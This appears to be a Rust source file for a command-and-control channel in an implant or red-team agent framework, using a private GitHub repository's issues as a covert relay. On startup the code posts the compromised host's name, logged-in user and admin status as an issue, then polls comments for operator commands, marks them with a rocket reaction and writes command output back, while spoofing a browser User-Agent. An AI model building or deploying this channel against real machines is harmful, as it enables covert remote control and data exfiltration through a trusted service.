use crate::channels::{Channel, ChannelError};
use serde::{Serialize, Deserialize};
use base64::encode;
use reqwest::Client;
use reqwest::header::{HeaderMap, AUTHORIZATION, USER_AGENT, ACCEPT};
use serde_json::{json, to_string};
use async_trait::async_trait;
use crate::logger::*;
use whoami::hostname;
use crate::cmd::AgentCommand;
use crate::cmd::getprivs::is_elevated;

/// Base GitHub API URL
const URL_BASE: &str = "https://api.github.com/repos/";

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GitHubConfig {
    pub username: String,
    pub access_token: String,
    pub repo_name: String,
    pub issue_id: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GitHubChannel {
    pub config: GitHubConfig,
    #[serde(skip_serializing, skip_deserializing)]
    pub logger: Logger,
    #[serde(skip_serializing, skip_deserializing)]
    pub client: Client
}

/// ## GitHub-based Communication
/// 
/// ### Channel Setup
/// 
/// 1. Create a private GH Repo for use with Agents
/// 2. Create a Fine-Grained personal access token with Issue permissions
/// 3. Load `username` and `access_token` data into your config.
/// 
/// ### Channel Usage
/// 
/// Each beacon will create its own issue in the provided repo. From there,
/// commands and data will be structured as comments on the issue.
/// 
/// Completed commands are marked with 🚀 as a reaction. The result text is appended to the
/// existing comment.
/// 
/// ### Code Flow
/// 
/// 1. Import Channel Config.
/// 2. Initialize Channel.
///     a. Create new Issue with hostname data as title.
/// 3. Await comments.
/// 4. Parse comments into [AgentCommand]s. The command's `rel` is the comment id.
/// 5. Complete command by adding 🚀 as a reaction.
/// 6. Send results as appended text to original comment, triple-backticks for code blocks.
/// 
impl GitHubChannel {

    ///
    /// Constructor for [GitHubChannel]
    /// The [GitHubConfig] is coming in serialized because we've defined the types
    /// all the way down. When the full config file is loaded from wherever it's loaded,
    /// this struct will already exist and not need to be parsed here.
    /// 
    async fn _new(config: GitHubConfig, log_level: u64) -> Result<GitHubChannel, ChannelError> {

        let logger = Logger::new(log_level);
        
        let client = GitHubChannel::client(&config.username, &config.access_token)?;
        Ok(GitHubChannel {config, logger, client})

    }

    ///
    /// Generates an ad-hoc client for use with the Notion API.
    /// The client cannot be part of the `NotionChannel` struct because
    /// [Deserialize] is not implemented for [Client], and we need the entirety of the struct
    /// to be Json-ifiable.
    /// 
    /// So while we pay a minor memory and speed cost for spinning this up with each request,
    /// it's better than a global client getting passed around everywhere.
    /// 
    fn client(username: &str, access_token: &str) -> Result<Client, ChannelError> {
        let mut headers = HeaderMap::new();

        // Build Authorization string for b64 encoding
        let mut auth_str = String::from(username);
        auth_str.push_str(":");
        auth_str.push_str(access_token);

        let encoded_auth = encode(auth_str.as_bytes());
        

        headers.insert(USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36".parse().unwrap());
        headers.insert(ACCEPT, "application/vnd.github+json".parse().unwrap());
        // headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
        headers.insert(AUTHORIZATION, format!("Basic {}", encoded_auth).parse().unwrap());

        Ok(Client::builder()
            .default_headers(headers)
            .build().unwrap()
        )
    }

    ///
    /// Gets comments from the GitHub issue.
    /// 
    async fn get_comments(&self) -> Result<serde_json::Value, String> {
        let repo_name = &self.config.repo_name;
        let username = &self.config.username;
        let issue_id = &self.config.issue_id;
        let url = format!("{URL_BASE}{username}/{repo_name}/issues/{issue_id}/comments");

        let r = self.client.get(url).send().await.unwrap();

        if r.status().is_success() {
            //println!("[*] Got blocks");
            let blocks = r.json::<serde_json::Value>().await.unwrap();
            return Ok(blocks);
        }
        Err(r.text().await.unwrap())
    }

}

#[async_trait]
impl Channel for GitHubChannel {
    async fn init(&mut self, log_level: u64) -> Result<String, ChannelError> {
        // Assign logger
        self.logger = Logger::new(log_level);
        self.logger.info(format!("Creating Issue..."));
        // Get hostname
        let mut hn = hostname();

        let is_admin = is_elevated();  

        // Set client correctly
        let client = GitHubChannel::client(&self.config.username, &self.config.access_token)?;
        self.client = client;

        self.logger.info(log_out!("Hostname: ", &hn));
        self.logger.debug(format!("Config options: {:?}", self.config));

        // Get username
        let username = whoami::username();
        hn.push_str(" | ");
        hn.push_str(&username);

        self.logger.info(format!("Admin context: {}", is_admin));
        if is_admin {
            hn.push_str("*");
        }

        let url = format!("{}{}/{}/issues", URL_BASE, self.config.username, self.config.repo_name);
        
        // Craft JSON Body
        let body: serde_json::Value = json!({
            "title": hn,
            "body": lc!("Beacon initialized")
        });

        self.logger.debug(log_out!("Create Issue URL: ", &url));

        let r = self.client
            .post(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        if r.status().is_success() {
            match r.json::<serde_json::Value>().await {
                Ok(v) => {
                    // println!("{:?}", v);
                    let issue_id = v["number"].as_u64().unwrap().to_string();
                    self.config.issue_id = issue_id.to_string();
                    println!("{:?}", self.config);
                    Ok(issue_id.to_string())
                },
                Err(e) => {
                    println!("{e}");
                    self.logger.crit(log_out!("Could not get issue id"));
                    Err(ChannelError { msg: "Could not get issue id".to_string()})
                }
            }
            // let res_body = .unwrap();
            // self.config.issue_id = res_body["id"].as_str().unwrap().to_string();
            // return Ok(String::from(res_body["id"].as_str().unwrap()));
        } else {
            println!("{}", r.text().await.unwrap());
            Err(ChannelError { msg: "Could not get issue id".to_string()})
        }

        // let result_text = r.text().await.unwrap();
        // // Annoying to_string() here because that's a move before the return
        // self.logger.debug(result_text.to_string());
        // Ok(result_text)
    }

    async fn send(&self, data: String, comment_id: &str) -> Result<String,ChannelError> {
        self.logger.debug(format!("{data}"));
        let mut issue_block = String::from("```\n");
        issue_block.push_str(data.as_str());
        issue_block.push_str("\n```\n");
        let repo_name = &self.config.repo_name;
        let username =  &self.config.username;
        let url = format!("{URL_BASE}{username}/{repo_name}/issues/comments/{comment_id}");
        let body : serde_json::Value = json!({
            "body": issue_block
        });
        let r = self.client
            .patch(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        
        if r.status().is_success() {
            let result_text = r.text().await.unwrap();
            Ok(result_text)
        } else {
            let msg = r.status().as_str().to_owned();
            Err(ChannelError::new(&msg))
        }

    }

    async fn receive(&self) -> Result<Vec<AgentCommand>, ChannelError> {
        let comments = self.get_comments().await.unwrap();

        let new_comments: Vec<&serde_json::Value> = comments
            .as_array()
            .unwrap()
            .into_iter()
            .filter(|&c| c["reactions"]["rocket"] == 0)
            .collect();

        let mut new_commands: Vec<AgentCommand> = Vec::new();
        for comment in new_comments {
            match comment["body"].as_str() {
                Some(s) => {
                    let mut agent_command = AgentCommand::from_string(
                        s.trim().to_string()
                    ).unwrap();
                    let comment_id = comment["id"].as_u64().unwrap();
                    agent_command.rel = comment_id.to_string();
                    new_commands.push(agent_command);
                },
                None => { continue; }
            }
        }
        Ok(new_commands)
    }

    async fn complete(&self, cmd: AgentCommand) -> () {
        let repo_name = &self.config.repo_name;
        let username = &self.config.username;
        let comment_id = &cmd.rel;
        let url = format!("{URL_BASE}{username}/{repo_name}/issues/comments/{comment_id}/reactions");

        // Creates a 🚀 icon on the comment, marking it as complete.
        let body : serde_json::Value = json!({
            "content": "rocket"
        });

        let r = self.client
            .post(url)
            .json(&body)
            .send()
            .await
            .unwrap();

        
        if !r.status().is_success() {
            let result_text = r.text().await.unwrap();
            self.logger.err(log_out!("Completion error:", &result_text)) ;
        } else {
            self.logger.debug(log_out!("Command completed"));
        }
    }

    /// Produces a base64 encoded String of the Options.
    ///
    /// This is useful for sending ConfigOptions to launch commands
    /// 
    fn to_base64(&self) -> String {
        encode(to_string(&self.config).unwrap().as_bytes())
    }

    fn update(&self, _options:String) -> Result<String, ChannelError>  {
        todo!()
    }
}